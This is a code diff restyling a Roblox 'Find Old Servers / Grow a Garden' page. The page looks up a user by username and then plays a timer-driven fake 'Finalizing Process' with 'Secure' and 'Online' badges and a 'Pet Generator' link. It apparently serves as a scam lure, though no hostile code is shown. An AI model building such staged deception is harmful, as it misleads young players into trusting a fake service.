@@ -9,7 +9,7 @@ import { Card, CardContent } from "@/components/ui/card"
 import { useToast } from "@/hooks/use-toast"
 import { Avatar, AvatarImage, AvatarFallback } from "@/components/ui/avatar"
 import { Badge } from "@/components/ui/badge"
-import { ExternalLink, Sparkles, CheckCircle, Loader2 } from "lucide-react"
+import { ExternalLink, Sparkles, CheckCircle, Loader2, Users, Clock, Shield } from "lucide-react"
 
 interface RobloxUser {
   id: number
@@ -29,7 +29,7 @@ export default function HomePage() {
   const [robloxUser, setRobloxUser] = useState<RobloxUser | null>(null)
   const [isLoading, setIsLoading] = useState(false)
   const [showServerProcess, setShowServerProcess] = useState(false)
-  const [processStep, setProcessStep] = useState(-1) // Start at -1 so first step shows loading
+  const [processStep, setProcessStep] = useState(-1)
   const [showJoinButton, setShowJoinButton] = useState(false)
   const { toast } = useToast()
 
@@ -37,7 +37,6 @@ export default function HomePage() {
     if (showServerProcess) {
       const processSteps = ["Connecting to account...", "Finding old servers...", "Awaiting final confirmation..."]
 
-      // Start first step immediately
       if (processStep === -1) {
         const timer = setTimeout(() => {
           setProcessStep(0)
@@ -45,19 +44,17 @@ export default function HomePage() {
         return () => clearTimeout(timer)
       }
 
-      // Progress through steps
       if (processStep >= 0 && processStep < processSteps.length - 1) {
         const timer = setTimeout(() => {
           setProcessStep(processStep + 1)
-        }, 1200) // Increased delay for better visual effect
+        }, 1200)
         return () => clearTimeout(timer)
       }
 
-      // Show join button after final step
       if (processStep === processSteps.length - 1) {
         const timer = setTimeout(() => {
           setShowJoinButton(true)
-        }, 1500) // Wait longer before showing join button
+        }, 1500)
         return () => clearTimeout(timer)
       }
     }
@@ -66,11 +63,7 @@ export default function HomePage() {
   const fetchRobloxUser = async (username: string) => {
     setIsLoading(true)
     try {
-      console.log("[v0] Fetching user:", username)
-
       const response = await fetch(`/api/roblox-user?username=${encodeURIComponent(username)}`)
-
-      console.log("[v0] Response status:", response.status)
 
       if (!response.ok) {
         const errorData = await response.json()
@@ -78,13 +71,10 @@ export default function HomePage() {
       }
 
       const userData = await response.json()
-      console.log("[v0] User data received:", userData)
-
       setRobloxUser(userData)
       setShowServerProcess(true)
-      setProcessStep(-1) // Reset to -1 to start animation sequence
+      setProcessStep(-1)
     } catch (error) {
-      console.log("[v0] Error fetching user:", error)
       toast({
         title: "User Not Found",
         description: "Could not find a Roblox user with that username",
@@ -110,7 +100,7 @@ export default function HomePage() {
 
     setShowServerProcess(false)
     setShowJoinButton(false)
-    setProcessStep(-1) // Reset step counter
+    setProcessStep(-1)
 
     await fetchRobloxUser(username.trim())
   }
@@ -130,7 +120,7 @@ export default function HomePage() {
 
   return (
     <div
-      className="min-h-screen flex items-center justify-center p-4"
+      className="min-h-screen flex items-center justify-center p-4 relative"
       style={{
         backgroundImage: "url(/grow-a-garden-bg.jpg)",
         backgroundSize: "cover",
@@ -138,35 +128,77 @@ export default function HomePage() {
         backgroundRepeat: "no-repeat",
       }}
     >
-      {/* Overlay for better text readability */}
-      <div className="absolute inset-0 bg-black/20" />
+      <div className="absolute inset-0 bg-gradient-to-b from-black/30 via-black/20 to-black/40" />
 
-      <div className="relative z-10 w-full max-w-md">
-        <Card className="bg-white/95 backdrop-blur-sm border-4 border-yellow-400 shadow-2xl">
+      <div className="absolute inset-0 overflow-hidden pointer-events-none">
+        <div className="absolute top-1/4 left-1/4 w-2 h-2 bg-yellow-400 rounded-full animate-pulse opacity-60" />
+        <div className="absolute top-1/3 right-1/3 w-1 h-1 bg-green-400 rounded-full animate-bounce opacity-40" />
+        <div className="absolute bottom-1/4 left-1/3 w-1.5 h-1.5 bg-blue-400 rounded-full animate-pulse opacity-50" />
+      </div>
+
+      <div className="relative z-10 w-full max-w-lg">
+        <Card className="bg-gradient-to-br from-white via-gray-50 to-gray-100 backdrop-blur-md border-4 border-yellow-400 shadow-2xl rounded-2xl overflow-hidden">
+          <div className="bg-gradient-to-r from-blue-600 to-blue-700 p-2 border-b-2 border-yellow-400">
+            <div className="flex items-center justify-between">
+              <div className="flex items-center space-x-2">
+                <div className="w-3 h-3 bg-red-500 rounded-full" />
+                <div className="w-3 h-3 bg-yellow-500 rounded-full" />
+                <div className="w-3 h-3 bg-green-500 rounded-full" />
+              </div>
+              <div className="text-white text-sm font-bold">Roblox Server Finder</div>
+              <div className="flex items-center space-x-1">
+                <Shield className="w-4 h-4 text-white" />
+                <span className="text-white text-xs">Secure</span>
+              </div>
+            </div>
+          </div>
+
           <CardContent className="p-8">
             <div className="text-center mb-8">
               <h1
-                className="text-4xl font-bold text-yellow-500 mb-2"
+                className="text-5xl font-black text-transparent bg-clip-text bg-gradient-to-r from-yellow-400 via-yellow-500 to-orange-500 mb-2 transform -rotate-1"
                 style={{
-                  textShadow: "3px 3px 0px #000, -1px -1px 0px #000, 1px -1px 0px #000, -1px 1px 0px #000",
+                  textShadow: "4px 4px 0px #000, -2px -2px 0px #000, 2px -2px 0px #000, -2px 2px 0px #000",
+                  filter: "drop-shadow(2px 2px 4px rgba(0,0,0,0.3))",
+                  fontFamily: "var(--font-fredoka), ui-sans-serif, system-ui, sans-serif",
                 }}
               >
                 FIND OLD SERVERS
               </h1>
               <h2
-                className="text-2xl font-bold text-red-600 mb-4"
+                className="text-3xl font-black text-transparent bg-clip-text bg-gradient-to-r from-red-500 via-red-600 to-red-700 mb-4 transform rotate-1"
                 style={{
-                  textShadow: "2px 2px 0px #000, -1px -1px 0px #000, 1px -1px 0px #000, -1px 1px 0px #000",
+                  textShadow: "3px 3px 0px #000, -1px -1px 0px #000, 1px -1px 0px #000, -1px 1px 0px #000",
+                  filter: "drop-shadow(2px 2px 4px rgba(0,0,0,0.3))",
+                  fontFamily: "var(--font-fredoka), ui-sans-serif, system-ui, sans-serif",
                 }}
               >
                 GROW A GARDEN
               </h2>
+
+              <div className="flex justify-center space-x-4 mb-4">
+                <div className="flex items-center space-x-1 bg-green-100 px-3 py-1 rounded-full">
+                  <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
+                  <span className="text-xs font-bold text-green-700">Online</span>
+                </div>
+                <div className="flex items-center space-x-1 bg-blue-100 px-3 py-1 rounded-full">
+                  <Users className="w-3 h-3 text-blue-600" />
+                  <span className="text-xs font-bold text-blue-700">24/7</span>
+                </div>
+                <div className="flex items-center space-x-1 bg-purple-100 px-3 py-1 rounded-full">
+                  <Clock className="w-3 h-3 text-purple-600" />
+                  <span className="text-xs font-bold text-purple-700">Legacy</span>
+                </div>
+              </div>
             </div>
 
             <form onSubmit={handleSubmit} className="space-y-6">
               <div>
-                <label htmlFor="username" className="block text-sm font-bold text-gray-700 mb-2">
-                  Roblox Username
+                <label
+                  htmlFor="username"
+                  className="block text-sm font-black text-gray-800 mb-2 uppercase tracking-wide"
+                >
+                  🎮 Roblox Username
                 </label>
                 <Input
                   id="username"
@@ -174,74 +206,91 @@ export default function HomePage() {
                   value={username}
                   onChange={(e) => setUsername(e.target.value)}
                   placeholder="Enter your username..."
-                  className="text-lg p-3 border-2 border-gray-300 focus:border-yellow-400 focus:ring-yellow-400"
+                  className="text-lg p-4 border-3 border-gray-400 focus:border-yellow-500 focus:ring-2 focus:ring-yellow-400 rounded-xl bg-white/90 backdrop-blur-sm font-bold shadow-inner"
                   disabled={isSubmitting || isLoading}
                 />
               </div>
 
               {robloxUser && (
-                <div className="bg-gray-50 rounded-lg p-4 border-2 border-gray-200">
-                  <div className="flex items-center space-x-3 mb-3">
-                    <Avatar className="w-12 h-12">
-                      <AvatarImage
-                        src={robloxUser.avatarUrl || `/roblox-avatar.png`}
-                        alt={robloxUser.displayName}
-                        onError={(e) => {
-                          console.log("[v0] Avatar image failed to load for user:", robloxUser.id)
-                          e.currentTarget.src = "/roblox-avatar.png"
-                        }}
-                      />
-                      <AvatarFallback>
-                        {robloxUser.displayName?.charAt(0) || robloxUser.name?.charAt(0) || "?"}
-                      </AvatarFallback>
-                    </Avatar>
-                    <div>
-                      <div className="flex items-center gap-2">
-                        <h3 className="font-bold text-lg">{robloxUser.displayName || robloxUser.name}</h3>
+                <div className="bg-gradient-to-br from-gray-50 to-gray-100 rounded-xl p-5 border-3 border-gray-300 shadow-lg">
+                  <div className="flex items-center space-x-4 mb-4">
+                    <div className="relative">
+                      <Avatar className="w-16 h-16 border-3 border-white shadow-lg">
+                        <AvatarImage
+                          src={robloxUser.avatarUrl || `/roblox-avatar.png`}
+                          alt={robloxUser.displayName}
+                          onError={(e) => {
+                            e.currentTarget.src = "/roblox-avatar.png"
+                          }}
+                        />
+                        <AvatarFallback className="bg-gradient-to-br from-blue-400 to-blue-600 text-white font-bold text-xl">
+                          {robloxUser.displayName?.charAt(0) || robloxUser.name?.charAt(0) || "?"}
+                        </AvatarFallback>
+                      </Avatar>
+                      <div className="absolute -bottom-1 -right-1 w-5 h-5 bg-green-500 border-2 border-white rounded-full animate-pulse" />
+                    </div>
+                    <div className="flex-1">
+                      <div className="flex items-center gap-2 mb-1">
+                        <h3 className="font-black text-xl text-gray-800">
+                          {robloxUser.displayName || robloxUser.name}
+                        </h3>
                         {robloxUser.hasVerifiedBadge && (
-                          <Badge variant="secondary" className="bg-blue-100 text-blue-800">
+                          <Badge className="bg-gradient-to-r from-blue-500 to-blue-600 text-white font-bold px-2 py-1 shadow-md">
                             ✓ Verified
                           </Badge>
                         )}
                       </div>
-                      <p className="text-sm text-gray-600">@{robloxUser.name}</p>
+                      <p className="text-sm text-gray-600 font-bold">@{robloxUser.name}</p>
+                      <p className="text-xs text-gray-500 mt-1">
+                        🗓️ Joined: {new Date(robloxUser.created).toLocaleDateString()}
+                      </p>
                     </div>
                   </div>
-                  {robloxUser.description && <p className="text-sm text-gray-700 mb-2">{robloxUser.description}</p>}
-                  <p className="text-xs text-gray-500">Joined: {new Date(robloxUser.created).toLocaleDateString()}</p>
+                  {robloxUser.description && (
+                    <div className="bg-white/70 rounded-lg p-3 border border-gray-200">
+                      <p className="text-sm text-gray-700 italic">"{robloxUser.description}"</p>
+                    </div>
+                  )}
                 </div>
               )}
 
               {showServerProcess && (
-                <div className="bg-white rounded-lg p-6 border-2 border-gray-300 shadow-lg">
-                  <div className="text-center mb-4">
-                    <h3 className="text-xl font-bold text-gray-800 mb-4">Finalizing Process</h3>
-                    <Avatar className="w-16 h-16 mx-auto mb-4">
-                      <AvatarImage
-                        src={robloxUser?.avatarUrl || `/roblox-avatar.png`}
-                        alt={robloxUser?.displayName}
-                        onError={(e) => {
-                          console.log("[v0] Modal avatar image failed to load for user:", robloxUser?.id)
-                          e.currentTarget.src = "/roblox-avatar.png"
-                        }}
-                      />
-                      <AvatarFallback>
-                        {robloxUser?.displayName?.charAt(0) || robloxUser?.name?.charAt(0) || "?"}
-                      </AvatarFallback>
-                    </Avatar>
+                <div className="bg-gradient-to-br from-white to-gray-50 rounded-xl p-6 border-3 border-blue-400 shadow-2xl">
+                  <div className="text-center mb-6">
+                    <h3 className="text-2xl font-black text-gray-800 mb-4 uppercase tracking-wide">
+                      ⚡ Finalizing Process
+                    </h3>
+                    <div className="relative">
+                      <Avatar className="w-20 h-20 mx-auto mb-4 border-4 border-blue-400 shadow-lg">
+                        <AvatarImage
+                          src={robloxUser?.avatarUrl || `/roblox-avatar.png`}
+                          alt={robloxUser?.displayName}
+                          onError={(e) => {
+                            e.currentTarget.src = "/roblox-avatar.png"
+                          }}
+                        />
+                        <AvatarFallback className="bg-gradient-to-br from-blue-400 to-blue-600 text-white font-bold text-2xl">
+                          {robloxUser?.displayName?.charAt(0) || robloxUser?.name?.charAt(0) || "?"}
+                        </AvatarFallback>
+                      </Avatar>
+                      <div className="absolute inset-0 border-4 border-transparent border-t-yellow-400 rounded-full animate-spin" />
+                    </div>
                   </div>
 
-                  <div className="space-y-3 mb-6">
+                  <div className="space-y-4 mb-6">
                     {processSteps.map((step, index) => (
-                      <div key={index} className="flex items-center space-x-3">
+                      <div
+                        key={index}
+                        className="flex items-center space-x-4 p-3 rounded-lg bg-white/50 border border-gray-200"
+                      >
                         {index < processStep ? (
-                          <CheckCircle className="w-5 h-5 text-green-500" />
+                          <CheckCircle className="w-6 h-6 text-green-500 flex-shrink-0" />
                         ) : index === processStep ? (
-                          <Loader2 className="w-5 h-5 text-blue-500 animate-spin" />
+                          <Loader2 className="w-6 h-6 text-blue-500 animate-spin flex-shrink-0" />
                         ) : (
-                          <CheckCircle className="w-5 h-5 text-gray-300" />
+                          <div className="w-6 h-6 border-2 border-gray-300 rounded-full flex-shrink-0" />
                         )}
-                        <span className={`text-sm ${index <= processStep ? "text-gray-800" : "text-gray-400"}`}>
+                        <span className={`font-bold ${index <= processStep ? "text-gray-800" : "text-gray-400"}`}>
                           {step}
                         </span>
                       </div>
@@ -251,9 +300,9 @@ export default function HomePage() {
                   {showJoinButton && (
                     <Button
                       onClick={handleJoinServer}
-                      className="w-full text-lg font-bold py-3 bg-green-600 hover:bg-green-700 text-white"
+                      className="w-full text-xl font-black py-4 bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white border-3 border-green-700 rounded-xl shadow-lg transform transition-all duration-200 hover:scale-105 hover:shadow-xl uppercase tracking-wide"
                     >
-                      JOIN SERVER
+                      🚀 JOIN SERVER NOW!
                     </Button>
                   )}
                 </div>
@@ -263,21 +312,20 @@ export default function HomePage() {
                 <Button
                   type="submit"
                   disabled={isSubmitting || isLoading}
-                  className="w-full text-lg font-bold py-3 bg-green-600 hover:bg-green-700 text-white border-2 border-green-800 shadow-lg transform transition-transform hover:scale-105"
+                  className="w-full text-xl font-black py-4 bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white border-3 border-green-800 rounded-xl shadow-lg transform transition-all duration-200 hover:scale-105 hover:shadow-xl uppercase tracking-wide"
                 >
-                  {isLoading ? "Loading User..." : isSubmitting ? "Submitting..." : "FIND OLD SERVERS!"}
+                  {isLoading ? "🔍 Loading User..." : isSubmitting ? "⏳ Submitting..." : "🎯 FIND OLD SERVERS!"}
                 </Button>
               )}
             </form>
 
-            <div className="mt-4">
+            <div className="mt-6">
               <Button
                 onClick={handlePetGenerator}
                 variant="outline"
-                className="w-full text-lg font-bold py-3 bg-purple-600 hover:bg-purple-700 text-white border-2 border-purple-800 shadow-lg transform transition-transform hover:scale-105"
+                className="w-full text-lg font-black py-4 bg-gradient-to-r from-purple-500 to-purple-600 hover:from-purple-600 hover:to-purple-700 text-white border-3 border-purple-800 rounded-xl shadow-lg transform transition-all duration-200 hover:scale-105 hover:shadow-xl uppercase tracking-wide"
               >
-                <Sparkles className="w-5 h-5 mr-2" />
-                PET GENERATOR
+                <Sparkles className="w-5 h-5 mr-2" />🐾 PET GENERATOR
                 <ExternalLink className="w-4 h-4 ml-2" />
               </Button>
             </div>
